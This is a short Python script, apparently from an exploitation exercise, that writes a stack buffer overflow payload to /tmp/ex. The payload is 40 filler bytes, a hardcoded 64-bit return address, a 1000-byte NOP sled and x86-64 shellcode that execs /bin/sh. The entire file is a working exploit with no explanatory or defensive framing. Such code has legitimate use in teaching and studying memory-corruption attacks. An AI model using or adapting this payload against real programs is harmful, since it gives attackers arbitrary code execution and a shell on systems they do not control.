from struct import pack

filler = b"A" * 40
ret = pack("<Q", 0x7FFFFFFFE628)  # dönüş adresi
nop = b"\x90" * 1000  # nop slide
shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x90"  # shellcode

f = open("/tmp/ex", "wb")
f.write(filler + ret + nop + shell + b"\n")
f.close()
